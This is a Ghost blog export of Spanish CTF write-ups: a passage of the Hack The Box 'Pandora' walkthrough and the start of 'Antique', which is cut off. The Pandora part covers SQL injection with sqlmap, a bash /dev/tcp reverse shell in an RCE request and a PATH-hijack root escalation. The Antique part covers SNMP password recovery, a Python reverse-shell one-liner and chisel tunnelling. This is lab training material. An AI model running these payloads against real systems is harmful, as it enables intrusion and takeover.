in\n/var/www/pandora/pandora_console/include/db/mysql.php\non line 114\nAccess is not granted</code></pre><p>Además, el reporte de la vulnerabilidad nos alerta de la posibilidad de efectuar un bypass de autenticación si fuésemos capaces de introducir un ID de sesión válido.</p><p>Es el turno de recurrir a SQLMap.</p><p>Tras aprovecharnos de la vulnerabilidad y de enumerar las diferentes tablas de la base de datos con sqlmap, vamos a proceder a lanzar un último comando con el fin de recuperar un identificador de sesión del usuario Matt.</p><pre><code class=\"language-bash\">sqlmap -u http://localhost:8080/pandora_console/include/chart_generator.php?session_id=1 -D pandora --sql-query=\"SELECT * FROM tsessions_php WHERE data LIKE '%mat%'\"</code></pre><p>De esta forma, si accedo desde mi navegador a http://localhost:8080/pandora_console/include/chart_generator.php?session_id=&lt;gathered_session_id&gt; y posteriormente a http://localhost:8080/pandora_console/index.php, me encontraré dentro del sistema.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2022/01/Screenshot_6.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"975\" height=\"456\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/01/Screenshot_6.png 600w, __GHOST_URL__/content/images/2022/01/Screenshot_6.png 975w\" sizes=\"(min-width: 720px) 720px\"><figcaption>Pandora FMS 742 index</figcaption></figure><p>Llegados a este punto, tras visitar cada uno de los menús en busca de alguna opción de continuar con el proceso, me he decantado por buscar en internet vulnerabilidades relativas a PandoraFMS de ejecución de código remoto o RCE. He encontrado un <a href=\"https://www.rapid7.com/db/modules/exploit/linux/http/pandora_fms_events_exec/\">enlace </a>donde se describe un script de Metasploit que permite hacer esto. He decidido lanzar Burpsuite para interceptar la petición que lanza el script y ver con mis propios ojos que hace el exploit. Tras incrustarle la cookie que me permite estar autenticado y ver la ubicación de donde poner el comando a ejecutar, he obtenido la primera flag básica del usuario Matt.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2022/01/burpsuite2.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"876\" height=\"504\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/01/burpsuite2.png 600w, __GHOST_URL__/content/images/2022/01/burpsuite2.png 876w\" sizes=\"(min-width: 720px) 720px\"><figcaption>Burpsuite repeater</figcaption></figure><p>Posteriormente, he utilizado de nuevo Burpsuite para recibir en mi máquina una reverse shell de Matt.</p><p>Ejecuto netcat en escucha en mi máquina local en el puerto 443</p><pre><code class=\"language-bash\">nc -lvp 443</code></pre><p>y en Burpsuite preparo la petición con la IP de mi máquina, apuntando al puerto 443 donde voy a recibir la shell del usuario que está ejecutando PandoraFMS</p><pre><code class=\"language-bash\"># php -r 'system(\"bash -c \\\"bash -i &gt;&amp; /dev/tcp/10.10.15.17/443 0&gt;&amp;1\\\"\");'\ninclude/ajax/events&amp;perform_evento_responses=100000&amp;targets=php%20-r%20%27system%28%22bash%20-c%20%5C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.17%2F443%200%3E%261%5C%22%22%29%3B%27&amp;response_id=1</code></pre><h2 id=\"4-escalado-de-privilegios\">4. Escalado de privilegios</h2><p>Cada vez queda menos para el final. Una vez dentro, como Matt, necesito convertirme en el usuario root. Para ello, vamos a buscar ficheros con el privilegio SUID. Este privilegio lo que hace es que el que ejecute el dicho fichero, lo hará con los permisos del creador del archivo.</p><p>Nos vamos a la raíz y ejecutamos lo siguiente:</p><pre><code class=\"language-bash\">cd /\n\nmatt@pandora:/$ find \\-perm -4000 2&gt;/dev/null\nfind \\-perm -4000 2&gt;/dev/null\n...\n./usr/bin/pandora_backup\n\nmatt@pandora:/$ ls -l /usr/bin/pandora_backup\n-rwsr-x--- 1 root matt 16816 Dec  3 15:58 /usr/bin/pandora_backup</code></pre><p>He eliminado parte del output para quedarnos con lo más importante.</p><p>El binario /usr/bin/pandora_backup tiene permisos de ejecución por los miembros del grupo Matt. Y recordamos que el usuario con el que tenemos acceso ahora es Matt.</p><p>Pero esto no es suficiente. Necesitamos saber que hace ese binario para ver si podemos inyectar algún tipo de código malicioso para que sea el usuario root quien lo ejecute. Si imprimimos los caracteres del binario con el fin de sacar algo más de información, observamos lo siguiente:</p><pre><code class=\"language-bash\">matt@pandora:/$ cat /usr/bin/pandora_backup\nELF&gt;�@0:@8\n          @@@@h���HHmm   HH�-�=�=hp�-�=�=����DDP�td� � � &lt;&lt;Q�tdR�td�-�=�=/lib64/ld-linux-x86-64.so.2GNUqtðG7�%H9�\n                                                                                                                 ��f��Z�GNU\n�\n�e�m\\ 4x � %\"putssetreuidsystemgetuidgeteuid__cxa_finalize__libc_start_mainlibc.so.6GLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTableFu�i\tP�p�0HH@�?�?�?�?\t�?\nSH�=��&amp;/�DH�=�/H��/H9�tH��.H��t@�����H�=Y/H�5R/H)�H��H��?H��H�H��tH��.H����fD���=/u/UH�=�.H��t�H���PTL��H�\n                                                                                              H�=�.�-����h�����.]�����{���UH��SH������������މ������H�=n����H�=�����H�=��������tH�=��d�����H�=��Q���H�=��E����H�]���f.�AWL�=�+AVI��AUI��ATA��UH�-�+SL)�H������H��t�L��L��D��A��H��H9�u�H�[]A\\A]A^A_��H�H��PandoraFMS Backup UtilityNow attempting to backup PandoraFMS clienttar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*Backup failed!\nCheck your permissions!Backup successful!Terminating program!&lt;(�������������X}�������h���8zRx\n                                                                                            8���+zRx\n                                                                                                   $����`FJ\nE�w                                                                                                        �?�;*3$\"D���$\\�����A�C\n  D����]B�I�E �E(�D0�H8�G@j8A0A(B BB�(���p0F\n</code></pre><p>El binario ejecuta el comando TAR desde una ruta relativa. Esto da lugar a un tipo de vulnerabilidad conocida como Path Hijacking.</p><p>Los comandos que se pueden ejecutar de forma relativa es gracias a la variable de entorno PATH. Si imprimimos PATH obtenemos lo siguiente:</p><pre><code class=\"language-bash\">matt@pandora:/var/www/pandora/pandora_console$ echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code></pre><p>Linux, busca dentro de esas rutas absolutas el binario del comando que quieres ejecutar. Es decir, primero buscará TAR en /usr/local/sbin, luego en /usr/local/bin, luego en /usr/sbin y así sucesivamente.</p><p>De esta forma, lo que se puede hacer es modificar la variable PATH para tener otra ubicación absoluta, pero una que a mi me interese. En ella, almacenaré un binario denominado TAR que ejecutará una shell. Y gracias a que pandora_backup es un archivo con permisos SUID y su propietario es root, obtendré automáticamente una shell con permisos totales del sistema.</p><p>Allá vamos. Lo primero que vamos a hacer es tener una shell más confiable. Vamos a generarle a Matt una clave pública/privada con el fin de poder conectarnos por ssh sin contraseña (recordamos que no la tenemos, hemos accedido a la shell por una shell reversa).</p><pre><code class=\"language-bash\">cd /home/matt &amp;&amp; ssh-keygen</code></pre><p>Nos copiamos la id_rsa (clave privada) en nuestra máquina e id_rsa.pub (clave pública) la ponemos dentro del fichero authorized_keys de la máquina atacada.</p><p>De esta forma, podrémos crear una shell desde nuestra máquina y efectuar los siguientes comandos para efectuar la vulnerabilidad de Path Hijacking.</p><pre><code class=\"language-bash\">iocio@127.0.0.1:~$ chmod 600 id_rsa &amp;&amp; ssh -i id_rsa matt@pandora.htb\nmatt@pandora:~$ export PATH=/tmp:$PATH\nmatt@pandora:~$ echo $PATH\n/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games\nmatt@pandora:~$ /usr/bin/pandora_backup \nPandoraFMS Backup Utility\nNow attempting to backup PandoraFMS client\nroot@pandora:~# whoami\nroot</code></pre><p>Y listo. Ya tenemos acceso al sistema. Recuperamos la flag y terminamos con la máquina.</p><pre><code class=\"language-bash\">root@pandora:~# cat /root/root.txt \nXXX</code></pre>",
            "comment_id": "61f55a526ac095014c9c3d1f",
            "plaintext": "He de decir que esta máquina aunque se encuentra entre las fáciles, me ha costado más de lo que me imaginaba y de hecho, los usuarios de la plataforma tienen otra opinión de la dificultad al respecto, como se puede ver en la imagen inferior:\n\n\n1. Reconocimiento\n\nAntes de nada, añadimos a nuestro /etc/hosts el dominio de la máquina por si estuviese sirviendo un servicio a través de algún virtual hosting.\n\nPrimero de todo, verificamos conexión con el objetivo.\n\nping -c 1 pandora.htb -R\nPING pandora.htb (10.10.11.136) 56(124) bytes of data.\n64 bytes from pandora.htb (10.10.11.136): icmp_seq=1 ttl=63 time=43.7 ms\nRR: \t10.10.14.16 (10.10.14.16)\n\t10.10.10.2 (10.10.10.2)\n\tpandora.htb (10.10.11.136)\n\tpandora.htb (10.10.11.136)\n\t10.10.14.1 (10.10.14.1)\n\t10.10.14.16 (10.10.14.16)\n\nSiendo el TTL~64, podemos asumir que nos encontramos ante una máquina Linux, en lugar de Windows, puesto que estas últimas suelen tener TTL~128.\n\nLanzamos un primer comando de NMAP con el fin de enumerar puertos TCP abiertos.\n\nnmap -p- -sT --min-rate 5000 --open -vvv -n -Pn -oG allPorts pandora.htb\n# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)\nHost: 10.10.11.136 ()\tStatus: Up\nHost: 10.10.11.136 ()\tPorts: 22/open/tcp//ssh///, 80/open/tcp//http///\n# Nmap done at Mon Jan 24 18:01:26 2022 -- 1 IP address (1 host up) scanned in 50.99 seconds\n\nVeo que el puerto 80 está abierto y trato de ver que me encuentro:\n\nTras haber investigado la web y haber un poco de Fuzzing, doy con una vía muerta. Continúo examinando los puertos UDP a ver que me encuentro.\n\nnmap -p- -sU --min-rate 5000 --open -vvv -n -Pn -oG allPortsUdp pandora.htb \n\nEn este caso, después de haber echado un vistazo a los puertos TCP y no haber encontrado nada interesante, nos interesa mirar los puertos UDP de la máquina por si hay algo que nos pueda resultar útil. Tras haber examinado los puertos, nos encontramos con el puerto 161/UDP abierto. Tras lanzar el siguiente script obtenemos más información al respecto.\n\nnmap -sUV -p161 -oN targetedUdp pandora.htb\nNmap scan report for pandora.htb (10.10.11.136)\nHost is up (0.043s latency).\n\nPORT    STATE SERVICE VERSION\n161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)\nService Info: Host: pandora\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Tue Jan 25 19:12:28 2022 -- 1 IP address (1 host up) scanned in 2.07 seconds\n\nSNMP es un protocolo de gestión de red que sirve para monitorizar de forma centralizada el estado de distintos dispositivos conectados a una misma red.\n\n\n2. Análisis de vulnerabilidades\n\nCon el siguiente comando lanzamos un cliente SNMP e imprimimos el resultado en un archivo de texto que posteriormente analizaremos:\n\nsnmpwalk -v 2c -O n -c public pandora.htb > snmp.txt\n\nAnalizando el archivo snmp.txt y realizando una lectura diagonal de las más de 2000 líneas que contiene, me encuentro con el siguiente resultado:\n\n.1.3.6.1.2.1.25.4.2.1.5.832 = STRING: \"-f\"\n2034   │ .1.3.6.1.2.1.25.4.2.1.5.836 = STRING: \"-f\"\n2035   │ .1.3.6.1.2.1.25.4.2.1.5.840 = STRING: \"-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'\"\n\nHay un usuario denominado \"daniel\". Intentamos conectarnos a la máquina con las credenciales y...\n\nssh daniel@pandora.htb\ndaniel@pandora.htb's password: \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)\nLast login: Sat Jan 29 16:40:25 2022 from 10.10.15.11\ndaniel@pandora:~$ whoami\ndaniel\ndaniel@pandora:~$ hostname -I\n10.10.11.136 \n\nEstamos dentro. Nos anotamos las credenciales por si las volviésemos a necesitar posteriormente. Continuamos examinando el equipo. Hay otro usuario en el equipo llamado Matt y no podemos entrar en su directorio. Pero quiero saber que es ese proceso (/usr/bin/host_check) que requería las credenciales de dani.\n\nImprimo las cadenas de caracteres que contiene el binario y me encuentro la siguiente URL: http://127.0.0.1/pandora_console/include/api.php?op=get&op2=all_agents&return_type=csv&other_mode=url_encode_separator_|&user=daniel&pass=HotelBabylon23\n\nSi accedo desde mi máquina, no puedo ver nada. Solo tengo acceso desde el sistema de daniel.\n\nssh -L 8080:pandora.htb:80 daniel@pandora.htb\n\nDado que desde pandora.htb, lanzando una petición al puerto 80 soy capaz de ver la nueva máquina, con el comando de arriba realizo un túnel ssh que sincroniza mi puerto local 8080 con el puerto 80 de destino. De esta manera, soy capaz de acceder a la siguiente ventana:\n\n\n3. Explotación\n\nPandoraFMS es un software de monitorización de red que coincide con lo que habíamos descubierto hasta ahora. Llegados a este punto, el siguiente paso natural es comprobar si la versión que hay instalada de pandora (PandoraFMS472) es vulnerable a algún tipo de exploit. Y sí, tras una pequeña búsqueda en Google nos podemos encontrar el siguiente link (CVE-2021-32099).\n\nEn él, podemos ver que hay un archivo .php vulnerable a SQL Injection. El archivo en cuestión es /include/chart_generator.php, y el parámetro inyectable es session_id.\n\nTras efectuar unas pruebas a http://127.0.0.1:8080/pandora_console/include/chart_generator.php?session_id=1'+or+1=1 podemos confirmar que dicho parámetro es susceptible de inyecciones SQL.\n\nSQL error\n: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' LIMIT 1' at line 1 ('SELECT * FROM tsessions_php WHERE `id_session` = '1' or 1=1' LIMIT 1') in\n/var/www/pandora/pandora_console/include/db/mysql.php\non line 114\nAccess is not granted\n\nAdemás, el reporte de la vulnerabilidad nos alerta de la posibilidad de efectuar un bypass de autenticación si fuésemos capaces de introducir un ID de sesión válido.\n\nEs el turno de recurrir a SQLMap.\n\nTras aprovecharnos de la vulnerabilidad y de enumerar las diferentes tablas de la base de datos con sqlmap, vamos a proceder a lanzar un último comando con el fin de recuperar un identificador de sesión del usuario Matt.\n\nsqlmap -u http://localhost:8080/pandora_console/include/chart_generator.php?session_id=1 -D pandora --sql-query=\"SELECT * FROM tsessions_php WHERE data LIKE '%mat%'\"\n\nDe esta forma, si accedo desde mi navegador a http://localhost:8080/pandora_console/include/chart_generator.php?session_id=<gathered_session_id> y posteriormente a http://localhost:8080/pandora_console/index.php, me encontraré dentro del sistema.\n\nLlegados a este punto, tras visitar cada uno de los menús en busca de alguna opción de continuar con el proceso, me he decantado por buscar en internet vulnerabilidades relativas a PandoraFMS de ejecución de código remoto o RCE. He encontrado un enlace donde se describe un script de Metasploit que permite hacer esto. He decidido lanzar Burpsuite para interceptar la petición que lanza el script y ver con mis propios ojos que hace el exploit. Tras incrustarle la cookie que me permite estar autenticado y ver la ubicación de donde poner el comando a ejecutar, he obtenido la primera flag básica del usuario Matt.\n\nPosteriormente, he utilizado de nuevo Burpsuite para recibir en mi máquina una reverse shell de Matt.\n\nEjecuto netcat en escucha en mi máquina local en el puerto 443\n\nnc -lvp 443\n\ny en Burpsuite preparo la petición con la IP de mi máquina, apuntando al puerto 443 donde voy a recibir la shell del usuario que está ejecutando PandoraFMS\n\n# php -r 'system(\"bash -c \\\"bash -i >& /dev/tcp/10.10.15.17/443 0>&1\\\"\");'\ninclude/ajax/events&perform_evento_responses=100000&targets=php%20-r%20%27system%28%22bash%20-c%20%5C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.17%2F443%200%3E%261%5C%22%22%29%3B%27&response_id=1\n\n\n4. Escalado de privilegios\n\nCada vez queda menos para el final. Una vez dentro, como Matt, necesito convertirme en el usuario root. Para ello, vamos a buscar ficheros con el privilegio SUID. Este privilegio lo que hace es que el que ejecute el dicho fichero, lo hará con los permisos del creador del archivo.\n\nNos vamos a la raíz y ejecutamos lo siguiente:\n\ncd /\n\nmatt@pandora:/$ find \\-perm -4000 2>/dev/null\nfind \\-perm -4000 2>/dev/null\n...\n./usr/bin/pandora_backup\n\nmatt@pandora:/$ ls -l /usr/bin/pandora_backup\n-rwsr-x--- 1 root matt 16816 Dec  3 15:58 /usr/bin/pandora_backup\n\nHe eliminado parte del output para quedarnos con lo más importante.\n\nEl binario /usr/bin/pandora_backup tiene permisos de ejecución por los miembros del grupo Matt. Y recordamos que el usuario con el que tenemos acceso ahora es Matt.\n\nPero esto no es suficiente. Necesitamos saber que hace ese binario para ver si podemos inyectar algún tipo de código malicioso para que sea el usuario root quien lo ejecute. Si imprimimos los caracteres del binario con el fin de sacar algo más de información, observamos lo siguiente:\n\nmatt@pandora:/$ cat /usr/bin/pandora_backup\nELF>�@0:@8\n          @@@@h���HHmm   HH�-�=�=hp�-�=�=����DDP�td� � � <<Q�tdR�td�-�=�=/lib64/ld-linux-x86-64.so.2GNUqtðG7�%H9�\n                                                                                                                 ��f��Z�GNU\n�\n�e�m\\ 4x � %\"putssetreuidsystemgetuidgeteuid__cxa_finalize__libc_start_mainlibc.so.6GLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTableFu�i\tP�p�0HH@�?�?�?�?\t�?\nSH�=��&/�DH�=�/H��/H9�tH��.H��t@�����H�=Y/H�5R/H)�H��H��?H��H�H��tH��.H����fD���=/u/UH�=�.H��t�H���PTL��H�\n                                                                                              H�=�.�-����h�����.]�����{���UH��SH������������މ������H�=n����H�=�����H�=��������tH�=��d�����H�=��Q���H�=��E����H�]���f.�AWL�=�+AVI��AUI��ATA��UH�-�+SL)�H������H��t�L��L��D��A��H��H9�u�H�[]A\\A]A^A_��H�H��PandoraFMS Backup UtilityNow attempting to backup PandoraFMS clienttar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*Backup failed!\nCheck your permissions!Backup successful!Terminating program!<(�������������X}�������h���8zRx\n                                                                                            8���+zRx\n                                                                                                   $����`FJ\nE�w                                                                                                        �?�;*3$\"D���$\\�����A�C\n  D����]B�I�E �E(�D0�H8�G@j8A0A(B BB�(���p0F\n\n\nEl binario ejecuta el comando TAR desde una ruta relativa. Esto da lugar a un tipo de vulnerabilidad conocida como Path Hijacking.\n\nLos comandos que se pueden ejecutar de forma relativa es gracias a la variable de entorno PATH. Si imprimimos PATH obtenemos lo siguiente:\n\nmatt@pandora:/var/www/pandora/pandora_console$ echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\nLinux, busca dentro de esas rutas absolutas el binario del comando que quieres ejecutar. Es decir, primero buscará TAR en /usr/local/sbin, luego en /usr/local/bin, luego en /usr/sbin y así sucesivamente.\n\nDe esta forma, lo que se puede hacer es modificar la variable PATH para tener otra ubicación absoluta, pero una que a mi me interese. En ella, almacenaré un binario denominado TAR que ejecutará una shell. Y gracias a que pandora_backup es un archivo con permisos SUID y su propietario es root, obtendré automáticamente una shell con permisos totales del sistema.\n\nAllá vamos. Lo primero que vamos a hacer es tener una shell más confiable. Vamos a generarle a Matt una clave pública/privada con el fin de poder conectarnos por ssh sin contraseña (recordamos que no la tenemos, hemos accedido a la shell por una shell reversa).\n\ncd /home/matt && ssh-keygen\n\nNos copiamos la id_rsa (clave privada) en nuestra máquina e id_rsa.pub (clave pública) la ponemos dentro del fichero authorized_keys de la máquina atacada.\n\nDe esta forma, podrémos crear una shell desde nuestra máquina y efectuar los siguientes comandos para efectuar la vulnerabilidad de Path Hijacking.\n\niocio@127.0.0.1:~$ chmod 600 id_rsa && ssh -i id_rsa matt@pandora.htb\nmatt@pandora:~$ export PATH=/tmp:$PATH\nmatt@pandora:~$ echo $PATH\n/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games\nmatt@pandora:~$ /usr/bin/pandora_backup \nPandoraFMS Backup Utility\nNow attempting to backup PandoraFMS client\nroot@pandora:~# whoami\nroot\n\nY listo. Ya tenemos acceso al sistema. Recuperamos la flag y terminamos con la máquina.\n\nroot@pandora:~# cat /root/root.txt \nXXX",
            "feature_image": "__GHOST_URL__/content/images/2022/01/pandora-750x410.jpg",
            "featured": 0,
            "type": "post",
            "status": "published",
            "locale": null,
            "visibility": "public",
            "email_recipient_filter": "all",
            "created_at": "2022-01-29T15:16:34.000Z",
            "updated_at": "2022-12-29T21:40:44.000Z",
            "published_at": "2022-12-29T21:39:00.000Z",
            "custom_excerpt": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "custom_template": null,
            "canonical_url": null,
            "newsletter_id": null
          },
          {
            "id": "63a223c10057530148112374",
            "uuid": "11266494-1bc5-4b70-9cd5-b0a27f6c1133",
            "title": "CTF - Antique WriteUp",
            "slug": "ctf-antique",
            "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/01/fases-proyecto-pentesting-768x478.png\",\"width\":768,\"height\":478,\"cardWidth\":\"\"}],[\"code\",{\"language\":\"bash\",\"code\":\"❯ nmap -p- -sT --open --min-rate 5000 -vvv -n -Pn -oG allPorts antique.htb\",\"caption\":\"NMAP all ports discovery\"}],[\"code\",{\"language\":\"bash\",\"code\":\"❯ nmap -p23 -sCV -vvv -oN targeted antique.htb\",\"caption\":\"NMAP specific port service version discovery\"}],[\"code\",{\"language\":\"bash\",\"code\":\"PORT   STATE SERVICE REASON         VERSION\\n23/tcp open  telnet? syn-ack ttl 63\\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\\nSF-Port23-TCP:V=7.92%I=7%D=1/30%Time=61F672BE%P=x86_64-pc-linux-gnu%r(NULL\\nSF:,F,\\\"\\\\nHP\\\\x20JetDirect\\\\n\\\\n\\\")%r(GenericLines,19,\\\"\\\\nHP\\\\x20JetDirect\\\\n\\\\nPas\\nSF:sword:\\\\x20\\\")%r(tn3270,19,\\\"\\\\nHP\\\\x20JetDirect\\\\n\\\\nPassword:\\\\x20\\\")%r(GetReq\\nSF:uest,19,\\\"\\\\nHP\\\\x20JetDirect\\\\n\\\\nPassword:\\\\x20\\\")%r(HTTPOptions,19,\\\"\\\\nHP\\\\x2\\nSF:0JetDirect\\\\n\\\\nPassword:\\\\x20\\\")%r(RTSPRequest,19,\\\"\\\\nHP\\\\x20JetDirect\\\\n\\\\nPa\\nSF:ssword:\\\\x20\\\")%r(RPCCheck,19,\\\"\\\\nHP\\\\x20JetDirect\\\\n\\\\nPassword:\\\\x20\\\")%r(DNS\\nSF:VersionBindReqTCP,19,\\\"\\\\nHP\\\\x20JetDirect\\\\n\\\\nPassword:\\\\x20\\\")%r(DNSStatusR\\nSF:equestTCP,19,\\\"\\\\nHP\\\\x20JetDirect\\\\n\\\\nPassword:\\\\x20\\\")%r(Help,19,\\\"\\\\nHP\\\\x20J\\nSF:etDirect\\\\n\\\\nPassword:\\\\x20\\\")%r(SSLSessionReq,19,\\\"\\\\nHP\\\\x20JetDirect\\\\n\\\\nPa\\nSF:ssword:\\\\x20\\\")%r(TerminalServerCookie,19,\\\"\\\\nHP\\\\x20JetDirect\\\\n\\\\nPassword:\\nSF:\\\\x20\\\")%r(TLSSessionReq,19,\\\"\\\\nHP\\\\x20JetDirect\\\\n\\\\nPassword:\\\\x20\\\")%r(Kerbe\\nSF:ros,19,\\\"\\\\nHP\\\\x20JetDirect\\\\n\\\\nPassword:\\\\x20\\\")%r(SMBProgNeg,19,\\\"\\\\nHP\\\\x20J\\nSF:etDirect\\\\n\\\\nPassword:\\\\x20\\\")%r(X11Probe,19,\\\"\\\\nHP\\\\x20JetDirect\\\\n\\\\nPasswor\\nSF:d:\\\\x20\\\")%r(FourOhFourRequest,19,\\\"\\\\nHP\\\\x20JetDirect\\\\n\\\\nPassword:\\\\x20\\\")%r\\nSF:(LPDString,19,\\\"\\\\nHP\\\\x20JetDirect\\\\n\\\\nPassword:\\\\x20\\\")%r(LDAPSearchReq,19,\\nSF:\\\"\\\\nHP\\\\x20JetDirect\\\\n\\\\nPassword:\\\\x20\\\")%r(LDAPBindReq,19,\\\"\\\\nHP\\\\x20JetDire\\nSF:ct\\\\n\\\\nPassword:\\\\x20\\\")%r(SIPOptions,19,\\\"\\\\nHP\\\\x20JetDirect\\\\n\\\\nPassword:\\\\x\\nSF:20\\\")%r(LANDesk-RC,19,\\\"\\\\nHP\\\\x20JetDirect\\\\n\\\\nPassword:\\\\x20\\\")%r(TerminalSe\\nSF:rver,19,\\\"\\\\nHP\\\\x20JetDirect\\\\n\\\\nPassword:\\\\x20\\\")%r(NCP,19,\\\"\\\\nHP\\\\x20JetDire\\nSF:ct\\\\n\\\\nPassword:\\\\x20\\\")%r(NotesRPC,19,\\\"\\\\nHP\\\\x20JetDirect\\\\n\\\\nPassword:\\\\x20\\nSF:\\\")%r(JavaRMI,19,\\\"\\\\nHP\\\\x20JetDirect\\\\n\\\\nPassword:\\\\x20\\\")%r(WMSRequest,19,\\\"\\nSF:\\\\nHP\\\\x20JetDirect\\\\n\\\\nPassword:\\\\x20\\\")%r(oracle-tns,19,\\\"\\\\nHP\\\\x20JetDirect\\nSF:\\\\n\\\\nPassword:\\\\x20\\\")%r(ms-sql-s,19,\\\"\\\\nHP\\\\x20JetDirect\\\\n\\\\nPassword:\\\\x20\\\")\\nSF:%r(afp,19,\\\"\\\\nHP\\\\x20JetDirect\\\\n\\\\nPassword:\\\\x20\\\")%r(giop,19,\\\"\\\\nHP\\\\x20JetD\\nSF:irect\\\\n\\\\nPassword:\\\\x20\\\");\\n\",\"caption\":\"\"}],[\"code\",{\"language\":\"bash\",\"code\":\"❯ telnet antique.htb\\nTrying 10.10.11.107...\\nConnected to antique.htb.\\nEscape character is '^]'.\\n\\nHP JetDirect\\n\\nPassword: 1234\\nInvalid password\\nConnection closed by foreign host.\"}],[\"code\",{\"language\":\"bash\",\"code\":\"❯ snmpwalk -v 2c -c public antique.htb .1.3.6.1.4.1.11.2.3.9.1.1.13.0\\niso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 \\n33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135\"}],[\"code\",{\"language\":\"bash\",\"code\":\"❯ echo \\\"50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 \\\\106 111 114 115 119 122 123 126 130 131 134 135\\\" | xxd -r -p\\n# P@ssw0rd@123!!123�q��\\\"2Rbs3CSs��$4�Eu�WGW�(8i\\tIY�aA�\\\"1&1A5# \"}],[\"code\",{\"language\":\"bash\",\"code\":\"❯ telnet antique.htb\\nTrying 10.10.11.107...\\nConnected to antique.htb.\\nEscape character is '^]'.\\nHP JetDirect\\n\\nPassword: P@ssw0rd@123!!123\\n\\nPlease type \\\"?\\\" for HELP\\n> \"}],[\"code\",{\"language\":\"python\",\"code\":\"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.14.16\\\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\\\"/bin/bash\\\")'\"}],[\"code\",{\"language\":\"sh\",\"code\":\"❯ nc -lvp 443\\nlistening on [any] 443 ...\\nconnect to [10.10.14.16] from antique.htb [10.10.11.107] 37726\\nlp@antique:~$ whoami\\nlp\\nlp@antique:~$ hostname -I\\n10.10.11.107 \\nlp@antique:~$ cat user.txt\\t\\n7d28xxxxxxxxxxxxxxxxxxxxx\"}],[\"code\",{\"language\":\"sh\",\"code\":\"lp@antique:~$ ss -tulpn | grep LISTEN\\ntcp     LISTEN   0        4096             0.0.0.0:631           0.0.0.0:*\\ntcp     LISTEN   0        128              0.0.0.0:23            0.0.0.0:* users:((\\\"python3\\\",pid=828,fd=3))\\ntcp     LISTEN   0        4096                [::]:631              [::]:*\"}],[\"code\",{\"language\":\"bash-l-root\",\"code\":\"❯ git clone https://github.com/jpillora/chisel\\n❯ cd chisel && go build -ldflags=\\\"-s -w\\\"\\n❯ sudo ./chisel server -p 8000 --reverse\"}],[\"code\",{\"language\":\"sh\",\"code\":\"❯ python3 -m http.server 8080\\nServing HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...\"}],[\"code\",{\"language\":\"sh\",\"code\":\"lp@antique:~$ wget 10.10.14.16:8080/chisel\\n...\\nchisel              100%[===================>]   7.75M  5.53MB/s    in 1.4s\\n2022-01-30 12:52:20 (5.53 MB/s) - ‘chisel’ saved [8130560/8130560]\\nlp@antique:~$ chmod +x chisel\\nlp@antique:~$ ./chisel client 10.10.14.16:8000 R:631:127.0.0.1:631\\n./chisel client 10.10.14.16:8000 R:631:127.0.0.1:631\\n2022/01/30 12:55:03 client: Connecting to ws://10.10.14.16:8000\\n2022/01/30 12:55:03 client: Connected (Latency 43.929004ms)\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/01/Screenshot_2.png\",\"width\":643,\"height\":507}],[\"code\",{\"language\":\"sh\",\"code\":\"lp@antique:~$ id\\nuid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)\"}],[\"code\",{\"language\":\"bash\",\"code\":\"lp@antique:~$ cupsctl 